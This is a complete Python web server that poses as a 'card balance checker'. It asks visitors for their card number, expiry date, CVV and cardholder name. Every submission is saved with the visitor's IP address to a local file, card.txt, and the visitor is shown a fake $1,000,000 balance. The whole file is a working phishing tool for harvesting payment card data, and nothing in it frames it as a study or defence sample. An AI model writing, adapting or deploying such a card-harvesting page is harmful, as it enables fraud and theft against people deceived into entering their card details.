import http.server
import socketserver
import urllib.parse

PORT = 8080

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'''
                <html>
                <style>
                body {
                    font-family: Arial, sans-serif;
                }
                h1 {
                    text-align: center;
                    color: green;
                 }
                form {
                    max-width: 300px;
                    margin: 0 auto;
                    padding: 20px;
                    border: 1px solid #ccc;
                    border-radius: 3px;
                    background-color: yellow;
                }
                label {
                    display: block;
                    margin-bottom: 10px;
                }
                input[type="text"] {
                    width: 100%;
                    padding: 10px;
                    border: 1px solid #ccc;
                    border-radius: 3px;
                }
                input[type="submit"] {
                    width: 100%;
                    padding: 10px;
                    border: none;
                    border-radius: 5px;
                    background-color: #4CAF50;
                    color: #fff;
                    cursor: pointer;
                }
                </style>
                </head>
                <body>
                <h1>hello user, welcome to card balance checker !</h1>
                <h2 style = "color: magenta; text-align: center;"> enter your credit or debit card details here and click check now </h2>
                <form action="/process" method="post">
                <label for="card_number">Card Number:</label>
                <input type="text" id="card_number" name="card_number" placeholder="Enter your card number" inputmode="numeric" required><br><br>
                <label for="expiry_date">Expiry Date:</label>
                <input type="text" id="expiry_date" name="expiry_date" placeholder="Enter the expiry date" inputmode="numeric" required><br><br>
                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" name="cvv" placeholder="Enter the CVV" inputmode="numeric" required><br><br>
                <label for="cardholder_name">Cardholder's Name:</label>
                <input type="text" id="cardholder_name" name="cardholder_name" placeholder="Enter the cardholder's name" required><br><br>
                <input type="submit" value="check now">
                </form>
                </body>
                </html>
            ''')
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>404 Not Found</h1></body></html>')

    def do_POST(self):
        if self.path == '/process':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            if 'card_number' in params and 'expiry_date' in params and 'cvv' in params and 'cardholder_name' in params:
                card_number = params['card_number'][0]
                expiry_date = params['expiry_date'][0]
                cvv = params['cvv'][0]
                cardholder_name = params['cardholder_name'][0]
                card_info = f"Card Number: {card_number}, Expiry Date: {expiry_date}, CVV: {cvv}, Cardholder's Name: {cardholder_name}"

                ip_address = self.client_address[0]
                card_info_with_ip = f"IP Address: {ip_address}\n{card_info}"

                with open('card.txt', 'a+') as f:
                    f.write(card_info_with_ip + '\n')

                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h1 style = "color:green;">your balance is $1,000,000!</h1></html>')
            else:
                self.send_response(400)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'<html><body><h1>Error: Invalid card information</h1></body></html>')
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'<html><body><h1>404 Not Found</h1></body></html>')

with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print("Serving at port", PORT)
    httpd.serve_forever()
